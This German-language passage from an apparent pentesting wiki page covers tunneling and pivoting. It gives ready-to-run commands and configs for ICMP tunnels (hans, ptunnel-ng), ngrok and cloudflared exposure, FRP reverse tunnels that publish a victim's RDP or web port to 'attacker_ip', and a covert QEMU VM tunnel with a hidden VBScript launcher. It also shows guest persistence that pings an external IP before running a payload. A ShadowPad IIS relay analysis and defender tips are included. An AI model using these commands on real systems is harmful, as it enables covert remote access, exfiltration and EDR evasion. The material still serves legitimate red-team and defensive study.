{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans dokumentiert einen IPv4-over-ICMP-Tunnel unter Verwendung eines TUN-Geräts und von ICMP-Echo-Requests; für die Einrichtung sind ausreichende Berechtigungen zum Erstellen des Interfaces erforderlich.<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Hier herunterladen**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng transportiert TCP-Verbindungen über ICMP und verwendet die unten gezeigten Optionen `-p`, `-l`, `-r` und `-R` für den Proxy, den lokalen Listener, den Zielhost und den Zielport.<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) ist ein Agent, mit dem lokale Netzwerkdienste über einen sicheren Tunnel online bereitgestellt werden können. Die CLI dokumentiert HTTP-, TCP- und File-URL-Endpunkte, und der ausgegebene Endpunkt-Hostname kann je nach Endpunkt und Konto variieren.<sup>[[39]](#references)</sup>

### Installation

- Konto erstellen: https://ngrok.com/signup
- Client herunterladen:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Grundlegende Verwendung

**Dokumentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Der Agent unterstützt bei Bedarf auch Authentifizierung und TLS-Optionen.<sup>[[39]](#references)</sup>_

#### TCP-Tunneling
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Dateien über HTTP verfügbar machen
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing von HTTP-Aufrufen

_Nützlich für XSS,SSRF,SSTI ..._\
Der standalone agent stellt seine HTTP-Inspektionsschnittstelle standardmäßig unter `http://127.0.0.1:4040` bereit; die Schnittstelle ist für HTTP-Traffic vorgesehen.<sup>[[40]](#references)</sup>

#### Tunneling eines internen HTTP-Service

Die Option `--host-header=rewrite` schreibt den HTTP-`Host`-Header des Upstreams so um, dass er dem lokalen Service entspricht.<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Einfaches Konfigurationsbeispiel für ngrok.yaml

Dies verwendet die ngrok Agent Config v2; benannte Tunnels verwenden `proto` und `addr` und werden mit `ngrok start` gestartet.<sup>[[42]](#references)</sup> Es öffnet 3 Tunnels:

- 2 TCP
- 1 HTTP mit Bereitstellung statischer Dateien aus /tmp/httpbin/
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Der `cloudflared`-Connector von Cloudflare Tunnel stellt ausgehende Verbindungen her; veröffentlichte Anwendungen können HTTP, HTTPS, TCP, SSH und RDP weiterleiten, während Quick Tunnels für die HTTP-Entwicklung vorgesehen sind.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick-Tunnel-Einzeiler
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 origin (legacy mode)

Das Legacy-`--socks5`-Flag teilt `cloudflared` mit, dass der lokale origin SOCKS5 spricht; es erstellt keinen lokalen SOCKS5-Listener. Für einen managed tunnel konfiguriert `originRequest.proxyType: socks` die SOCKS5-origin-Verarbeitung.<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### Persistente Tunnel mit DNS

Die lokal verwaltete Tunnelkonfiguration verwendet die kleingeschriebenen Schlüssel `tunnel`, `credentials-file` und `url` wie unten gezeigt.<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Starten Sie den Connector:
```bash
cloudflared tunnel run mytunnel
```
Der Connector stellt ausgehende Verbindungen her und handelt standardmäßig QUIC mit Fallback auf HTTP/2 aus; gehen Sie nicht davon aus, dass jedes Deployment TCP/443 verwendet. Führen Sie ihn nur mit den für Ihr Deployment erforderlichen Berechtigungen aus.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) ist ein Go-Reverse-Proxy, der **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX und XTCP** unterstützt. XTCP verwendet P2P hole punching, dessen Erfolg von NAT abhängt. Ab **v0.53.0** kann es als **SSH Tunnel Gateway** fungieren, sodass ein Zielhost den standardmäßigen OpenSSH-Client ohne eine `frpc`-Binary verwenden kann.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Klassischer reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Verwendung des neuen SSH-Gateways (keine frpc-Binärdatei)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Der obige Befehl veröffentlicht den Port **8080** des Opfers als **attacker_ip:9000** unter Verwendung des standardmäßigen OpenSSH-Clients, während `frps` als Gateway dient.<sup>[[50]](#references)</sup>

## Verdeckte VM-basierte Tunnels mit QEMU

Das User-Mode-Networking von QEMU erfordert für das virtuelle Netzwerk weder Root- noch Administratorrechte, und `-netdev user,hostfwd=...` leitet TCP-, UDP- oder UNIX-Verbindungen vom Host an den Gast weiter.<sup>[[51]](#references)</sup> TrustedSec dokumentierte eine Tiny-Core-QEMU-VM und einen versuchten Reverse-SSH-Tunnel in einem Vorfall, bei dem hostfokussiertes EDR Aktivitäten innerhalb des Gasts übersehen konnte.<sup>[[1]](#references)</sup>

### Kurzer Einzeiler
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Der obige Befehl startet einen **Tiny Core Linux**-Gast mit 256 MiB Gastarbeitsspeicher und einem qcow2-Disk-Image; das Disk-Image ist keine In-RAM-Disk.
• Port **2222/tcp** auf dem Windows-Host wird transparent an **22/tcp** innerhalb des Gasts weitergeleitet.
• Aus Sicht des Angreifers stellt das Ziel einfach Port 2222 bereit; alle dort eintreffenden Pakete werden vom in der VM laufenden SSH-Server verarbeitet.

### Heimlicher Start über VBScript

TrustedSec beobachtete bei dem oben zitierten Vorfall VBS-gesteuerte QEMU-Starts und Tiny-Core-Images.<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Das Ausführen des Skripts mit `cscript.exe //B update.vbs` hält das Fenster verborgen.<sup>[[1]](#references)</sup>

### Persistence innerhalb des Gasts

Der zitierte Vorfall beschreibt Persistence im zustandslosen Tiny-Core-Gast über `/opt/bootlocal.sh` und `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Payload nach `/opt/123.out` ablegen
2. An `/opt/bootlocal.sh` anhängen:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. `home/tc` und `opt` zu `/opt/filetool.lst` hinzufügen, damit der Payload beim Herunterfahren in `mydata.tgz` gepackt wird.

### Überlegungen zur Telemetrie

• Der Host stellt weiterhin den QEMU-Prozess, das qcow2-Image und jeden vom Host weitergeleiteten Listener bereit.
• Reine Prozess-Scans des Hosts untersuchen möglicherweise keine Gastprozesse, aber Virtualisierung bietet keine garantierte Umgehung; Netzwerk-, QEMU- und Image-Telemetrie kann den Gast weiterhin offenlegen.<sup>[[1]](#references)[[51]](#references)</sup>

### Tipps für Defender

• Auf **unerwartete QEMU-/VirtualBox-/KVM-Binaries** in vom Benutzer beschreibbaren Pfaden aufmerksam machen.
• Ausgehende Verbindungen blockieren, die von `qemu-system*.exe` ausgehen.
• Nach seltenen Listening-Ports (2222, 10022, …) suchen, die unmittelbar nach dem Start von QEMU gebunden werden.

## IIS/HTTP.sys-Relay-Knoten über `HttpAddUrl` (ShadowPad)

Check Point beschreibt das IIS-Modul von ShadowPad als Umwandlung kompromittierter Perimeter-Webserver in Backdoor- und Relay-Knoten, indem URL-Präfixe über `HttpAddUrl` gebunden werden.<sup>[[3]](#references)</sup>

Der gleiche Bericht beschreibt die unten zusammengefassten Standardwerte, Wildcard-Listener, Paketentschlüsselung, Relay-Warteschlangen und Debug-Telemetrie.<sup>[[3]](#references)</sup>

* **Config-Standards** – Wenn die JSON-Config des Moduls Werte auslässt, verwendet es glaubwürdige IIS-Standards (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Dadurch beantwortet IIS normalen Traffic mit dem korrekten Branding.
* **Wildcard-Abfangen** – Operatoren geben eine durch Semikolons getrennte Liste von URL-Präfixen an (Wildcards in Host und Pfad). Das Modul ruft für jeden Eintrag `HttpAddUrl` auf, sodass HTTP.sys passende Requests an den bösartigen Handler weiterleitet; nicht passende Requests fallen auf das normale IIS-Verhalten zurück.
* **Verschlüsseltes erstes Paket** – Die ersten beiden Bytes des Request-Bodys enthalten den Seed für einen benutzerdefinierten 32-Bit-PRNG. Jedes nachfolgende Byte wird vor dem Parsen des Protokolls mit dem erzeugten Keystream XOR-verknüpft:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay-Orchestrierung** – Das Modul verwaltet zwei Listen: „servers“ (Upstream-Knoten) und „clients“ (Downstream-Implants). Einträge werden entfernt, wenn etwa 30 Sekunden lang kein Heartbeat eintrifft. Wenn beide Listen nicht leer sind, ordnet es den ersten funktionierenden Server dem ersten funktionierenden Client zu und leitet Bytes zwischen ihren Sockets weiter, bis eine Seite die Verbindung schließt.
* **Debug-Telemetrie** – Eine optionale Protokollierung erfasst für jedes Paar Quell-IP, Ziel-IP und die insgesamt weitergeleiteten Bytes. Ermittler nutzten diese Spuren, um das ShadowPad-Mesh über mehrere Opfer hinweg zu rekonstruieren.

---

## Weitere zu prüfende Tools

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Versteckt im Schatten: Covert Tunnels über QEMU-Virtualisierung](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Vor ToolShell: Untersuchung der früheren Ransomware-Aktivitäten von Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Inside Ink Dragon: Das Relay-Netzwerk und die internen Abläufe einer unauffälligen offensiven Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap-Referenzhandbuch: Firewall-/IDS-Einschränkungen umgehen](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD-ssh-Handbuch](https://man.openbsd.org/ssh)
- [7] [OpenBSD-sshd_config-Handbuch](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH-9.6-Versionshinweise](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting in Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Dokumentation des Metasploit-socks_proxy-Moduls](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Dokumentation des Metasploit-autoroute-Moduls](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng-Schnellstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng-Listener](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng-Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat-Handbuch](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY-Plink-Handbuch](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY-Befehlszeilenoptionen](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft-netsh-interface-portproxy-Befehl](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier-Dokumentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier-Proxification-Regeln](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN-2.7-Handbuch](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Domainnamen – Implementierung und Spezifikation](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok-Agent-CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok-Web-Inspektionsoberfläche](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok Virtual Hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok-Agent-Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare-Tunnel-Übersicht](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare-Tunnel-Origin-Parameter](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare-Tunnel-Setup](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare-Tunnel-Konfigurationsdatei](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare-Tunnel-Ausführungsparameter](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp-Konzepte](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp-SSH-Tunnel-Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU-Netzwerkdokumentation](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
{{#include ../banners/hacktricks-training.md}}
